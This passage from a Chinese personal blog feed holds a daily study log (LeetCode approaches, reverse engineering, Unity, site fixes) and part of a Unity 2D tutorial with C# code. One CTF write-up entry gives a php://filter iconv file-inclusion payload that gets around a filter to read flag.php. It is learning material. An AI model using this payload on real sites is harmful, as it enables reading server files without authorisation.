力扣（LeetCode）</a></p><p>python3思路：直接两个for，超时。用前缀和，先for一次words，创建一个列表，每个元素存前idx个words满足条件的个数。然后再对queries做一个for，每次取出一个query。因为题目说包含l和r两个值，所以还要做个判断，如果query[0]是0直接返回在前缀和中找索引为query[1]的值，否则用前缀和中query[1]的值减去query[0]-1的值。返回结果列表。</p><p>时间：<script type="math/tex">O(n+m)</script></p><p>空间：<script type="math/tex">O(m)</script></p><p>n是words的长度，m是queries的长度。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-2-3"><p>反汇编代码分析：for、i++和++i。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-1"><a href="#2023-6-1" class="headerlink" title="2023-6-1"></a>2023-6-1</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-1-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-1-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-1-1"><p>英语单词。</p><p>区块链：哈希列表程序。</p><p>Web开发：管理系统的登录页面前端程序。</p><p>Web渗透：复习了一遍书。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-1-2"><p><a href="https://leetcode.cn/problems/maximum-tastiness-of-candy-basket/submissions/">2517. 礼盒的最大甜蜜度 - 力扣（LeetCode）</a></p><p>不会。看答案大概懂了。</p><p>python3：二分。先排序，然后选中间值为甜蜜度。然后遍历数组，前一元素设为price[0]，然后用后面的减前面的，如果大于等于甜蜜度，更新前一元素为当前元素，总数加一。遍历完成后如果选择元素个数大于等于k则满足条件，更新下界找更大甜蜜度，否则修改上界找更小甜蜜度，最后返回最大甜蜜度。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-5"><a href="#2023-5" class="headerlink" title="2023-5"></a>2023-5</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-31"><a href="#2023-5-31" class="headerlink" title="2023-5-31"></a>2023-5-31</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-31"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-31-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-31-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-31-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-31-1"><p>英语单词。</p><p>算法题。</p><p>逆向：switch-case分析。</p><p>Web渗透：简单复习。</p><p>Unity：点乘。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-31-2"><p><a href="https://leetcode.cn/problems/minimum-cost-tree-from-leaf-values/">1130. 叶值的最小代价生成树 - 力扣（LeetCode）</a></p><p>python3思路：贪心算法。写一个while，每次找到乘积最小的两个数，将乘积加到结果中去，然后移除小的那个数，大的那个数留下来当做叶节点乘积。直到数组长度小于2结束。注：最后移除要写<code>arr.pop(idx)</code>不能写<code>arr.remove(arr[idx])</code>，因为这样有重复数字的话它会找到第一个满足条件的数，这个数可能不是需要移除的数。</p><p>时间：<script type="math/tex">O(n^2)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-31-3"><p>反汇编代码分析：switch-case。</p><p>Unity：三维数学的Mathf。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-30"><a href="#2023-5-30" class="headerlink" title="2023-5-30"></a>2023-5-30</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-30"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-30-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-30-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-30-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-30-1"><p>英语单词。</p><p>算法题。</p><p>随便写了个获取图片链接图片程序。</p><p>逆向：if-else分析。</p><p>Unity：角度弧度。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-30-2"><p><a href="https://leetcode.cn/problems/delete-nodes-and-return-forest/">1110. 删点成林</a></p><p>写不出，学习了灵茶山艾府的答案。</p><p>python3思路：深度优先。先设置结果列表和把to_delete做成集合节约时间复杂度。然后dfs(root)，如果有结果表示根没有被移除，把根加到结果中，然后dfs。先判断当前节点是否为空，是就返回None，不是就左右dfs，结果直接替换掉当前结点的左右子树。然后判断当前点值是否在to_delete中。不在就返回node，在的话就判断当前结点左右子树是否为空，不为则表示是结果，加到结果列表中，最后再返回None。</p><p><br></p><p>学习灵茶山艾府教学视频：<a href="https://leetcode.cn/problems/combinations/">77. 组合</a></p><p>python3：深度优先，组合型递归。枚举下一个要选的值存入数组中。当数组长度满足题目要求后存入结果中。可以剪枝，每次递归时判断还需要的数的数量，然后后面递归的for的结束值减去这个数量就完成了剪枝。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-30-3"><p>反汇编代码分析：if-else。</p><p>Unity：三维数学的Mathf。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-29"><a href="#2023-5-29" class="headerlink" title="2023-5-29"></a>2023-5-29</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-29"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-29-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-29-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-29-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-29-1"><p>英语单词，听力，阅读练习。</p><p>算法题。</p><p>逆向：堆栈平衡和调用约定。</p><p>Unity：三维向量入门。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-29-2"><p><a href="https://leetcode.cn/problems/average-value-of-even-numbers-that-are-divisible-by-three/">2455. 可被三整除的偶数的平均值</a></p><p>解题思路：遍历取6的余数。</p><p>python3整活一行：<code>return 0 if (k:=[i for i in nums if i % 6 == 0]) == [] else int(sum(k) / len(k))</code></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-29-3"><p>反汇编代码分析：堆栈平衡和调用约定。</p><p>Unity：三维数学的Vector3。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023-5-28"></a>2023-5-28</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-28"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-28-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-28-2">英语【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-28-3">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-28-4">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-28-5">Unity使用【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-28-1"><p>英语单词。听力，阅读练习。高数不定积分。</p><p>算法题，CTF题。</p><p>逆向：一些汇编指令。</p><p>Unity使用：InputManage使用。</p><p>存疑：网站数学公式有时会无法渲染。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-28-2"><p>eye candy：有魅力但不聪明的人。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-28-3"><p><a href="https://leetcode.cn/problems/find-the-kth-smallest-sum-of-a-matrix-with-sorted-rows/">1439. 有序矩阵中的第 k 个最小数组和 - 力扣（LeetCode）</a></p><p>不会，学习了灵茶山艾府的答案。</p><p>python3思路：暴力。先获得前mat的第一行，切割到第k个，然后以此遍历后面的行与前面的做排列相加，相加结果从小到大排序后截取k个即可，因为不会用到k后面的数，最后返回相加结果的最后一个即第k个。</p><p>时间：<script type="math/tex">O(mnklog(nk))</script></p><p>空间：<script type="math/tex">O(nk)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-28-4"><p>T2.攻防世界——Web——题目名称-文件包含</p><p>之前见过类似的。简单来说就是使用php伪协议，然后发现他过滤了base64和read，于是用如下payload：<code>?filename=php://filter/convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=flag.php</code>。之后打开bp对中间的编码参数进行爆破测试，最后得出结果。</p><p>注：中间参数<code>&lt;input-encoding&gt;</code>和<code>&lt;output-encoding&gt;</code>之间的点不能换成 ‘/‘，否则会无任何返回结果。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-28-5"><p>Unity使用：InputManage使用。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-27"><a href="#2023-5-27" class="headerlink" title="2023-5-27"></a>2023-5-27</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-27"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-27-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-27-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-27-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-27-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-27-1"><p>英语单词。听力练习。</p><p>算法题，CTF题。</p><p>学习了逆向工具OD的函数分析。</p><p>复习了PHP的PDO的使用。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-27-2"><p><a href="https://leetcode.cn/problems/statistics-from-a-large-sample/">1093. 大样本统计 - 力扣（LeetCode）</a></p><p>python3解题思路：先设置一些变量，记录最大值，最小值，总个数，众数值和索引，总和。最小值设为-1。然后做一个for。每次都记录总和和总个数，然后判断最小值是否为-1，是就更新。最大值直接等于当前索引即可。众数则判断当前count是否大于众数值，大于就更新众数值和索引。最后再用一个for来判断中位数。先判断奇偶并获得总个数的一半，奇数还需要取int后+1。然后如果总个数的一半减当前count值大于0就依次减去当前count的值。否则就判断，奇数的话只要小于等于0，mid都等于当前索引，而偶数不同。偶数如果小于才等于当前索引，等于0的话还需要找到下一个数，然后两者相加除以2。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-27-3"><p>T1.攻防世界——Reverse——easyRE1</p><p>我的解法：拖进010Editor直接找flag</p><p>其他解法：</p><ol><li>kali：<code>strings easy-64 | grep FLAG</code></li><li>windows：<code>findstr /i flag easy-32</code>（<code>/i</code>忽略大小写，使用前先 <code>chcp 65001</code>）</li><li>ida：拖进去按F5</li></ol><p><br></p><p>T2.攻防世界——Reverse——1000Click</p><p>我的解法：连点器点1000次</p><p>正常解法：</p><ol><li>CE：首次扫描int，0。然后点一次，然后该值为1，再次扫描，找到地址，改为999，再点击一次。</li><li>OD：插件中文搜索引擎的智能搜索，然后搜Error!!（只搜error会找到别的地方），然后可以看到flag了。</li><li>ida：等待加载完成，ctrl+F找到Error，点击后可以看到success，对它按x，然后跳转，在附近可以直接看到flag。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-27-4"><p>新增反汇编代码分析文章。</p><p>更新了汇编工具的OD相关使用。</p><p>更新了PHP的PDO的使用。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-26"><a href="#2023-5-26" class="headerlink" title="2023-5-26"></a>2023-5-26</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-26"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-26-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-26-1"><p>修改了网站的简介栏。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-25"><a href="#2023-5-25" class="headerlink" title="2023-5-25"></a>2023-5-25</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-25"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-25-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-25-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-25-3">逆向工具【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-25-1"><p>算法题。</p><p>逆向工具。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-25-2"><p><a href="https://leetcode.cn/problems/odd-string-difference/">2451. 差值数组不同的字符串 - 力扣（LeetCode）</a></p><p>python3解题思路：直接按题意写，找到数组值存入字典中，字典键为不同整形数组元组，值为出现次数和索引的列表，判断该值是否已经存在字典中且字典长度为2。因为题目一定有解。所以如果满足条件就直接跳出循环，然后找到字典中出现次数为1的那个索引值，返回索引值对应的字符串。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-25-3"><p>OD更新基础用法。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-24"><a href="#2023-5-24" class="headerlink" title="2023-5-24"></a>2023-5-24</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-24"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-24-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-24-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-5-24-3">修复BUG【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-24-1"><p>英语单词。</p><p>算法题。</p><p>修复网站。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-24-2"><p>题目：<a href="https://leetcode.cn/problems/frog-position-after-t-seconds/submissions/">1377. T 秒后青蛙的位置 - 力扣（LeetCode）</a></p><p>python3题解思路：先构造领接表，然后进行搜索，搜索跳出条件是时间为0或没有下一节点，如果跳出时访问的位置就是目标，则返回1，否则返回0。然后进行搜索，用dfs和bfs都行。因为不可以重复访问节点，所以每次访问要把访问过的节点设为已访问再访问。访问下一节点时时间要减1。最后接收访问的结果，如果返回结果大于0表示找到目标，用返回结果除以父节点的子节点个数表示概率，依次把结果向上返回得到最终结果。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-24-3"><p>修复了runtime.js（页脚时钟）和readPercent.js（回到顶端百分比）的显示BUG</p><p>readPercent.js：原因未知。修复方式是将<code>&gt;=95</code>改成<code>&lt;=95</code>，然后将代码块对换。</p><p>runtime.js：错误原因是会自动在尾部加一些<code>&lt;/&gt;</code>标签。修复方式是修改了提示语句中的代码并在尾部加上 <code>//</code>以防再次出现BUG。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-23"><a href="#2023-5-23" class="headerlink" title="2023-5-23"></a>2023-5-23</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-23"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-23-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-23-2">所有文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-23-1"><p>更新了网站文章结构。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-23-2"><p>更新了所有文章的路径，内容结构等。</p><p>将显示错误的列表和数学公式修复了。</p><p>配置了<a href="https://ling71.gitee.io/posts/1518592324.html">mathjax</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-22"><a href="#2023-5-22" class="headerlink" title="2023-5-22"></a>2023-5-22</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-22"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-22-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-22-1"><p>简单更新了一些网站配置。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-5-21"><a href="#2023-5-21" class="headerlink" title="2023-5-21"></a>2023-5-21</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-5-21"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-5-21-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-5-21-2">拓展配置【网站】</button></li><li class="tab"><button type="button" data-href="#2023-5-21-3">样式配置【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-5-21-1"><p>V0.9版本制作完成。完成了网站的基础部署，文档部署等。</p><p>配置参考教程：<a href="https://www.fomal.cc/posts/eec9786.html">author::博客魔改教程总结(一) | Fomalhaut🥝</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-21-2"><p>V0.9配置的网站的拓展如下：</p><ol><li>文章双栏显示 </li><li>文章出场动画</li><li>评论信箱</li><li>wowjs动画</li><li>页脚计时器和其他信息</li><li>首页轮播栏</li><li>分类栏</li><li>md外挂标签</li><li>搜索栏</li><li>回到顶部百分比</li><li>来到底部</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-5-21-3"><p>V0.9配置的网站样式如下：</p><ol><li>主题色</li><li>图片</li><li>一图流背景</li><li>字体</li><li>雪花分割线</li><li>底部选择栏居中</li><li>顶部菜单栏</li><li>夜间霓虹灯</li><li>宇宙星空</li><li>个人卡片渐变色</li><li>页面样式整体更改</li><li>顶栏常驻</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Unity2D游戏</title>
      <link href="/posts/3e7b7d92.html"/>
      <url>/posts/3e7b7d92.html</url>
      
        <content type="html"><![CDATA[<h1 id="Unity2D游戏"><a href="#Unity2D游戏" class="headerlink" title="Unity2D游戏"></a>Unity2D游戏</h1><hr><h2 id="一、图片"><a href="#一、图片" class="headerlink" title="一、图片"></a>一、图片</h2><h3 id="1-人物"><a href="#1-人物" class="headerlink" title="1 人物"></a>1 人物</h3><blockquote><p>Pixels Per Unit：每个单元的像素。值越大图显示越小。</p><p>Pivot：中心点。</p><p>Default——Max Size：一般选宽高中的大的值的接近值。例如290 * 500 选 512。</p></blockquote><h3 id="2-问题"><a href="#2-问题" class="headerlink" title="2 问题"></a>2 问题</h3><blockquote><ol><li>图片太小：调节图片的Pixels Per Unit。</li></ol></blockquote><hr><h2 id="二、组件"><a href="#二、组件" class="headerlink" title="二、组件"></a>二、组件</h2><h3 id="1-Sprite-Renderer"><a href="#1-Sprite-Renderer" class="headerlink" title="1 Sprite Renderer"></a>1 Sprite Renderer</h3><blockquote><p>Sorting Layer：排序层。可以添加层，越在前面的层显示越在屏幕的前面。一般用Default设置Order in Layer既可。</p><p>Order in Layer：层。值越大显示越在屏幕前。</p></blockquote><h3 id="2-Camera"><a href="#2-Camera" class="headerlink" title="2 Camera"></a>2 Camera</h3><blockquote><p>Projection：Orthographic。</p><p>size：相机中心到边缘的unit个数。</p></blockquote><hr><h2 id="三、动画"><a href="#三、动画" class="headerlink" title="三、动画"></a>三、动画</h2><h3 id="1-人物动画"><a href="#1-人物动画" class="headerlink" title="1 人物动画"></a>1 人物动画</h3><blockquote><p>新建动画后，直接旋中所有图片拖拽激到animation中，再点击右边三个小点的Show Sample Rate（每秒帧数）进行调整既可。</p></blockquote><h3 id="2-Chinemachine"><a href="#2-Chinemachine" class="headerlink" title="2 Chinemachine"></a>2 Chinemachine</h3><blockquote><p>安装：</p><ol><li>Window——Package Manager——Packages:Unity Registry——Chinemachine——install</li><li>Hierarchy右键——Chinemachine——2D Camera。（此时主摄像机由CM vcam1控制）</li></ol><p>CM vcam1：</p><ul><li>Follow：跟随对象。</li><li>Lens——Ortho Size：网格大小。</li><li>Body：<ul><li>Damping：当人物离中心点 n 距离摄像机才开始移动。</li><li>Screen：人物所处位置。</li><li>Dead Zone：在范围中相机完全不移动。</li><li>Soft Zone：蓝色区域大小。玩家可移动的区域。红色区域玩家不可到达。</li><li>Bias：蓝色区域移动。</li></ul></li></ul><p>边界：</p><ol><li>Hierarchy右键——Create——Create Empty</li><li>Add Component——Polygon Collider 2D</li><li>Points——Path——Element0——Size：4</li><li>拖动边界为整个地图。</li><li>CM vcam1——Extensions——Add Extension——Cinemachine Confiner</li><li>拖入空物体至Bounding Shape 2D</li></ol></blockquote><hr><h2 id="四、脚本"><a href="#四、脚本" class="headerlink" title="四、脚本"></a>四、脚本</h2><h3 id="1-属性"><a href="#1-属性" class="headerlink" title="1 属性"></a>1 属性</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自身个体属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">float</span> speed;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> enemyLife;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自身其他属性</span></span><br><span class="line"><span class="keyword">public</span> Vector3 targetPosition, originPosition, terminalPosition;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自身状态</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">bool</span> isAfterBattleCheck;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自身组件</span></span><br><span class="line"><span class="keyword">private</span> BoxCollider2D box;</span><br><span class="line"><span class="keyword">private</span> Sprite</span><br><span class="line"><span class="keyword">private</span> Animator animator;</span><br><span class="line"><span class="keyword">public</span> GameObject attackCollider;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 外部组件</span></span><br><span class="line"><span class="keyword">private</span> GameObject player;</span><br></pre></td></tr></table></figure><h3 id="2-移动"><a href="#2-移动" class="headerlink" title="2 移动"></a>2 移动</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 上下左右移动</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">FixedUpdate</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Move();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Move</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> leftRight = Input.GetAxisRaw(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line">        <span class="built_in">float</span> upDown = Input.GetAxisRaw(<span class="string">&quot;Vertical&quot;</span>);</span><br><span class="line">        <span class="comment">// 转头</span></span><br><span class="line">        <span class="keyword">if</span> (leftRight &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            transform.localScale = <span class="keyword">new</span> Vector3(<span class="number">1f</span>, <span class="number">1f</span>, <span class="number">1f</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (leftRight &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            transform.localScale = <span class="keyword">new</span> Vector3(<span class="number">-1f</span>, <span class="number">1f</span>, <span class="number">1f</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 移动</span></span><br><span class="line">        transform.Translate(leftRight * Time.fixedDeltaTime * speed, upDown * Time.fixedDeltaTime * speed, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 动画</span></span><br><span class="line">        animator.SetFloat(<span class="string">&quot;Run&quot;</span>, Mathf.Max(Mathf.Abs(leftRight), Mathf.Abs(upDown)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 左右加跳跃</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PlayerControl</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> Rigidbody2D rb;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SerializeField</span>] <span class="keyword">private</span> <span class="built_in">float</span> moveSpeed;</span><br><span class="line">    [<span class="meta">SerializeField</span>] <span class="keyword">private</span> <span class="built_in">float</span> jumpForce;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">float</span> xInput;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        rb = GetComponent&lt;Rigidbody2D&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Movement();</span><br><span class="line">        CheckInput();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CheckInput</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        xInput = Input.GetAxisRaw(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">        &#123;</span><br><span class="line">            Jump();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Movement</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        rb.velocity = <span class="keyword">new</span> Vector2(xInput * moveSpeed, rb.velocity.y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Jump</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        rb.velocity = <span class="keyword">new</span> Vector2(rb.velocity.x, jumpForce);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-设置人物属性"><a href="#3-设置人物属性" class="headerlink" title="3 设置人物属性"></a>3 设置人物属性</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ShowInInspector</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">System.Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">struct</span> Attributes</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> HP;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> MP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">struct</span> Character</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> skinID;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> characterID;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否在属性前加上文字，后面必须跟公开属性或序列化的私有属性</span></span><br><span class="line">    <span class="comment">// [Header(&quot;Attributes&quot;)]</span></span><br><span class="line">    <span class="comment">// 属性中有子属性</span></span><br><span class="line">    <span class="keyword">public</span> Attributes attribute;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//[Header(&quot;Character&quot;)]</span></span><br><span class="line">    <span class="keyword">public</span> Character character;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在检视器中会新增一个空格</span></span><br><span class="line">    [<span 